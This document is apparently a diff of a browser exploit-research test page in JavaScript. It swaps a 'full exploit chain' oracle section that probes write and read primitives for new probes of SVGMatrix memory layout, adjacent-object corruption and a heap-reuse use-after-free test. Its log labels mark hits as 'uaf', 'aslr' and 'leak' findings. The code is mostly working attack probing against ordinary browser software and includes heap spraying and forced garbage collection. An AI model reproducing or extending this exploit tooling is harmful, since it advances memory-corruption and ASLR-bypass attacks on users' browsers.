+      localCTM.e===testVal2?'leak — getCTM shares backing with txMatrix!':
+      'info — getCTM returns copy: '+localCTM.e);
+  }
+
+  svg.remove();
+  prog('TY done');
+}
+
+// ════════════════════════════════════════════════════════════════════════
+// SZ — SVGMatrix struct size probe
+// write known patterns to mx.a, b, c, d, e, f
+// read back all 6 to establish the struct field layout
+// then probe adjacent writes: does writing past f corrupt the next object?
+// ════════════════════════════════════════════════════════════════════════
+function runSZ(){
+  hdr('SZ: SVGMatrix struct layout probe');
+
+  var svg=mkSVG(100,100);
+  var r=mkRect(svg,0,0,10,10);
+  var mx=getMX(r);
+
+  // SZ[1]: write distinct canaries to all 6 fields, read back
+  hdr('SZ[1]: all 6 fields canary write/read');
+  var fields={
+    a:fromHiLo(0x0000000A,0x0000000A),
+    b:fromHiLo(0x0000000B,0x0000000B),
+    c:fromHiLo(0x0000000C,0x0000000C),
+    d:fromHiLo(0x0000000D,0x0000000D),
+    e:fromHiLo(0x0000000E,0x0000000E),
+    f:fromHiLo(0x0000000F,0x0000000F)
+  };
+  Object.keys(fields).forEach(function(k){mx[k]=fields[k];});
+
+  var c=ctm(r);
+  log('SZ[1]: CTM after writing all fields:',
+    'info');
+  ['a','b','c','d','e','f'].forEach(function(k){
+    var got=c?c[k]:null;
+    var expected=fields[k];
+    log('SZ[1]:   field.'+k+': wrote='+f64hex(expected)+' CTM.'+k+'='+( got===null?'null':f64hex(got))+
+      ' match='+(got===expected),
+      got===expected?'pass — field '+k+' round-trips exact':'warn — field '+k+' mismatch');
+  });
+
+  // SZ[2]: struct size from allocation pattern
+  // create two SVGMatrix objects back to back, check address gap via timing
+  hdr('SZ[2]: create matrix chain — timing-based size estimate');
+  var t0=performance.now();
+  var chain=[];
+  for(var i=0;i<10000;i++){
+    var tmp=document.createElementNS(NS,'rect');
+    tmp.setAttribute('transform','matrix(1 0 0 1 0 0)');
+    chain.push(tmp.transform.baseVal.getItem(0).matrix);
+  }
+  var t1=performance.now();
+  log('SZ[2]: created 10000 SVGMatrix objects in '+(t1-t0).toFixed(1)+'ms ('+((t1-t0)/10000).toFixed(4)+'ms each)','info');
+  log('SZ[2]: SVGMatrix struct likely 48 or 64 bytes (6 × f64 = 48B + padding)','star');
+
+  // SZ[3]: does writing e/f with INT32_OVF corrupt adjacent field?
+  hdr('SZ[3]: overflow write adjacency — does OVF to mx.e corrupt mx.f?');
+  var svg3=mkSVG(100,100);
   var r3=mkRect(svg3,0,0,10,10);
   var mx3=getMX(r3);
-
-  var boundary=INT32_OVF;
-  var ar3vals=[
-    boundary-100, boundary-10, boundary-2, boundary-1,
-    boundary, boundary+1, boundary+2, boundary+10, boundary+100,
-    boundary*2, boundary*4
-  ];
-  ar3vals.forEach(function(v){
-    mx3.e=v;
-    var b=bcr(r3);
-    var c=ctm(r3);
-    var bx=b?b.x:null;
-    var ce=c?c.e:null;
-    var diff=(ce!==null&&bx!==null)?(ce-bx):null;
-    log('AR[3]: mx.e='+v+' BCR.x='+bx+' CTM.e='+ce+
-      (diff!==null?' DIFF='+diff.toExponential(4):''),
-      (diff!==null&&Math.abs(diff)>100)?'leak — BCR≠CTM: TWO DIFFERENT INTERNAL VALUES!':
-      (ce===v&&bx!==v)?'star — CTM tracks set value, BCR clamped!':'info');
-  });
+  var fCanary=fromHiLo(0xF0F0F0F0,0xF0F0F0F0);
+  mx3.f=fCanary;
+  mx3.e=INT32_OVF;  // write OVF to e — does it bleed into f?
+  var c3=ctm(r3);
+  log('SZ[3]: wrote OVF to mx.e, f canary was='+f64hex(fCanary)+
+    ' f now='+( c3?f64hex(c3.f):'null'),
+    c3&&c3.f===fCanary?'pass — f unchanged (no bleed)':
+    c3?'uaf — F VALUE CHANGED AFTER OVF WRITE TO E! was='+f64hex(fCanary)+' now='+f64hex(c3.f):
+    'warn');
   svg3.remove();
-  prog('AR done');
+
+  svg.remove();
+  prog('SZ done');
 }
 
 // ════════════════════════════════════════════════════════════════════════
-// WR — write primitive attempt
-// theory: SVGMatrix.e = arbitrary float → CTM reads it back
-// can we write a pointer-shaped value and confirm it was stored?
-// if yes: we have arbitrary write to SVGMatrix struct + read back via CTM
+// NB — neighbor probe
+// create two rects in same SVG back to back
+// write canary to rect[0]'s matrix, check if it appears in rect[1]'s CTM
+// if SVGMatrix objects are contiguous in memory, an overflow from [0] touches [1]
 // ════════════════════════════════════════════════════════════════════════
-function runWR(){
-  hdr('WR: write primitive — pointer-shaped values round-trip');
+function runNB(){
+  hdr('NB: neighbor probe — adjacent SVGMatrix objects');
 
-  // WR[1]: write increasing values, check at what point CTM stops tracking
-  hdr('WR[1]: CTM tracking ceiling — when does CTM stop?');
-  var svg=mkSVGHide(200,200);
-  var r=mkRect(svg,0,0,10,10);
-  var mx=getMX(r);
+  var N=4;  // create N rects, test adjacency between consecutive pairs
+  var svg=mkSVG(100,100);
+  var rects=[],mxs=[];
+  for(var i=0;i<N;i++){
+    var rr=mkRect(svg,i,0,5,5);
+    getMX(rr);
+    mxs.push(rr.transform.baseVal.getItem(0).matrix);
+    rects.push(rr);
+  }
 
-  var ceiling=null;
-  var testVals=[1e5,1e8,1e10,1e12,1e14,1e15,1e16,1e17,1e18,1e20,1e30,1e50,1e100,1e200,1e300,F64_MAX/2,F64_MAX];
-  testVals.forEach(function(v){
-    mx.e=v;
-    var c=ctm(r);
-    var ce=c?c.e:null;
-    var tracks=(ce!==null&&Math.abs(ce-v)/v<0.01);
-    if(!tracks&&ceiling===null)ceiling=v;
-    log('WR[1]: set='+v.toExponential(2)+' CTM.e='+( ce===null?'null':ce.toExponential(6))+
-      ' tracks='+tracks,
-      tracks?'leak — CTM tracks':ce===null?'warn — null':'warn — lost: '+ce);
+  // NB[1]: write canary to mx[0].e, check if mx[1] changed
+  hdr('NB[1]: write to mx[0] — does mx[1] see it?');
+  var nb1Canary=fromHiLo(0xAB1AB1AB,0x1AB1AB1A);
+  var nb1Canary2=nb1Canary;
+  mxs[0].e=nb1Canary2;
+  var after1=ctm(rects[1]);
+  log('NB[1]: wrote canary to mx[0].e, mx[1].e='+( after1?f64hex(after1.e):'null'),
+    after1&&after1.e===nb1Canary2?'uaf — MX[1] SAW MX[0] WRITE: ADJACENT MEMORY!':
+    'info — mx[1] independent (expected)');
+
+  // NB[2]: spray N rects, check if any share backing
+  hdr('NB[2]: N='+N+' rects — write unique canary to each, verify isolation');
+  var canaries=mxs.map(function(_,i){return fromHiLo(0xCA000000+i,0x00000000+i);});
+  mxs.forEach(function(m,i){m.e=canaries[i];});
+  // re-read all CTMs
+  var allOK=true;
+  mxs.forEach(function(m,i){
+    var c=ctm(rects[i]);
+    var got=c?c.e:null;
+    var ok=(got===canaries[i]);
+    if(!ok)allOK=false;
+    log('NB[2]: rect['+i+']: wrote='+f64hex(canaries[i])+' read='+( got===null?'null':f64hex(got))+' ok='+ok,
+      ok?'pass':'uaf — WRONG VALUE: possible aliasing!');
   });
-  log('WR[2]: CTM ceiling ~'+( ceiling===null?'F64_MAX (no ceiling!)':ceiling.toExponential(2)),
-    ceiling===null?'leak — NO CEILING: CTM tracks to F64_MAX!':'star — ceiling at '+ceiling);
-  svg.remove();
+  log('NB[2]: isolation result: '+(allOK?'all isolated':'ALIASING DETECTED!'),
+    allOK?'pass — matrices are isolated':'uaf — MATRIX ALIASING!');
 
-  // WR[2]: multi-field write — does writing mx.a/d/e simultaneously survive?
-  hdr('WR[2]: multi-field simultaneous write (a,d,e,f)');
-  var svg2=mkSVGHide(200,200);
-  var r2=mkRect(svg2,0,0,10,10);
-  var mx2=getMX(r2);
+  // NB[3]: create rect, delete it, create new rect — does new rect get old memory?
+  hdr('NB[3]: free/realloc — does new rect get freed matrix memory?');
+  var svg3=mkSVG(100,100);
+  var r3a=mkRect(svg3,0,0,5,5);
+  getMX(r3a);
+  var mx3a=r3a.transform.baseVal.getItem(0).matrix;
+  var freeCanary=fromHiLo(0xFEEBDAED,0xFEEBDAED);
+  mx3a.e=freeCanary;
+  // detach and hope memory is reused
+  r3a.remove();
+  // force GC
+  var junk=[];
+  for(var gi=0;gi<10000;gi++)junk.push(new Float64Array(16));
+  junk=null;
+  // allocate new rect
+  var r3b=mkRect(svg3,0,0,5,5);
+  getMX(r3b);
+  var c3b=ctm(r3b);
+  var got3b=c3b?c3b.e:null;
+  log('NB[3]: free canary='+f64hex(freeCanary)+' new rect CTM.e='+( got3b===null?'null':f64hex(got3b)),
+    got3b===freeCanary?'uaf — NEW RECT GOT FREED MATRIX MEMORY! UAF candidate!':
+    'info — new rect has fresh matrix (no reuse detected, value='+got3b+')');
 
-  var testCombos=[
-    {a:2.0,d:2.0,e:1e10,f:2e10},
-    {a:0.5,d:0.5,e:5e12,f:0},
-    {a:1.0,d:1.0,e:INT32_OVF,f:INT32_OVF},
-    {a:1.0,d:1.0,e:1e15,f:1e15}
-  ];
-  testCombos.forEach(function(tc){
-    mx2.a=tc.a;mx2.d=tc.d;mx2.e=tc.e;mx2.f=tc.f;
-    var c=ctm(r2);
-    var got_e=c?c.e:null;var got_f=c?c.f:null;
-    var got_a=c?c.a:null;var got_d=c?c.d:null;
-    var eOK=got_e!==null&&Math.abs(got_e-tc.e)/Math.max(1,tc.e)<0.001;
-    var fOK=got_f!==null&&Math.abs(got_f-tc.f)/Math.max(1,tc.f)<0.001;
-    log('WR[2]: set a='+tc.a+' e='+tc.e.toExponential(2)+' f='+tc.f.toExponential(2)+
-      ' → CTM.a='+got_a+' CTM.e='+( got_e===null?'null':got_e.toExponential(4))+
-      ' CTM.f='+( got_f===null?'null':got_f.toExponential(4))+
-      ' eOK='+eOK+' fOK='+fOK,
-      (eOK&&fOK)?'leak — MULTI-FIELD WRITE/READ OK':
-      (eOK||fOK)?'star — partial round-trip':'warn');
-  });
-  svg2.remove();
-  prog('WR done');
-}
-
-// ════════════════════════════════════════════════════════════════════════
-// CH — the chain: viewBox position → mx.e write → CTM.e read
-// full exploit chain primitive:
-//   1. embed element in large viewBox SVG
-//   2. write target float to mx.e
-//   3. read CTM.e → should expose actual internal layout float
-//   4. compare BCR vs CTM to find the clamping boundary
-//   5. use the BCR/CTM diff as a range oracle
-// ════════════════════════════════════════════════════════════════════════
-function runCH(){
-  hdr('CH: full chain — viewBox + mx.e write + CTM.e read oracle');
-
-  // CH[1]: viewBox svg + mx.e = large value → what does CTM.e return?
-  // the viewBox creates a scale factor; mx.e adds an additional translation
-  // in viewBox coordinates; CTM.e should expose this in screen-space
-  hdr('CH[1]: viewBox scale × mx.e translation → CTM.e output');
-  var vbScale=1e-6;  // 100px SVG / 1e-6 vbMax = 1e8 scale
-  var svg=mkSVGHide(100,100,'0 0 '+vbScale+' '+vbScale);
-  var r=mkRect(svg,0,0,vbScale/10,vbScale/10);
-  getMX(r);
-  var mx=r.transform.baseVal.getItem(0).matrix;
-
-  // set mx.e = large value IN VIEWBOX COORDS
-  // actual screen translation = mx.e * (100/1e-6) = mx.e * 1e8
-  var mxTests=[0, 1e-9, 1e-8, 1e-7, 1e-6, 1e-5, 1e-4, 1e-3, 0.01, 0.1, 1.0];
-  mxTests.forEach(function(v){
-    mx.e=v;
-    var b=bcr(r);
-    var c=ctm(r);
-    var expectedScreenX=v/vbScale*100;  // how much screen x should shift
-    log('CH[1]: mx.e='+v.toExponential(2)+' expectedScreen='+expectedScreenX.toFixed(1)+
-      ' BCR.x='+( b?b.x.toFixed(2):'null')+' CTM.e='+( c?c.e.toFixed(4):'null'),
-      b&&Math.abs(b.x-expectedScreenX)<1?'leak — BCR TRACKS VB TRANSLATION':'info');
-  });
-  svg.remove();
-
-  // CH[2]: BCR/CTM divergence as range oracle
-  // at exactly 2^31, BCR saturates but CTM should keep going
-  // measure the gap: CTM.e - BCR.x at various mx.e values past 2^31
-  hdr('CH[2]: BCR/CTM divergence oracle past 2^31');
-  var svg2=mkSVGHide(200,200);
-  var r2=mkRect(svg2,0,0,10,10);
-  var mx2=getMX(r2);
-
-  var oracleVals=[
-    INT32_OVF*0.5, INT32_OVF*0.9, INT32_OVF*0.99,
-    INT32_OVF, INT32_OVF*1.01, INT32_OVF*1.1,
-    INT32_OVF*2, INT32_OVF*4, INT32_OVF*8,
-    1e10, 1e12, 1e14, 1e15
-  ];
-  var diverged=0;
-  oracleVals.forEach(function(v){
-    mx2.e=v;
-    var b=bcr(r2);
-    var c=ctm(r2);
-    var bx=b?b.x:null;
-    var ce=c?c.e:null;
-    var diff=(ce!==null&&bx!==null)?(ce-bx):null;
-    if(diff!==null&&Math.abs(diff)>1)diverged++;
-    log('CH[2]: mx.e='+v.toExponential(3)+
-      ' BCR.x='+( bx===null?'null':bx.toExponential(4))+
-      ' CTM.e='+( ce===null?'null':ce.toExponential(6))+
-      ' DIFF='+( diff===null?'null':diff.toExponential(4)),
-      (diff!==null&&Math.abs(diff)>1e6)?'leak — MASSIVE BCR/CTM DIVERGENCE: leak='+diff.toExponential(4):
-      (diff!==null&&Math.abs(diff)>1)?'star — BCR/CTM diverged: '+diff.toExponential(4):
-      'info');
-  });
-  svg2.remove();
-
-  log('CH[3]: divergence events: '+diverged+'/'+oracleVals.length+
-    ' — BCR and CTM read from different internal values',
-    diverged>3?'aslr — BCR/CTM ORACLE CONFIRMED: '+diverged+' divergence points':
-    diverged>0?'star — partial divergence: '+diverged+' points':
-    'warn — no divergence found');
-
-  // CH[3]: summary
-  hdr('CH[4]: primitive chain status');
-  log('CH[4]: viewBox amplification: sets up float scale bypass','info');
-  log('CH[4]: mx.e write: direct write to SVGMatrix.e field (f64)','info');
-  log('CH[4]: CTM.e read: unclamped f64 read of internal transform','info');
-  log('CH[4]: BCR/CTM diff: oracle for internal clamping boundary','info');
-  log('CH[4]: IF CTM tracks past BCR ceiling → independent memory read path','star');
-  log('CH[4]: CHAIN: write mx.e=TARGET → read CTM.e → verify bit-for-bit','star');
-  prog('CH done — v32 complete');
+  svg.remove();svg3.remove();
+  prog('NB done — v33 complete');
 }
 </script>
 </body>
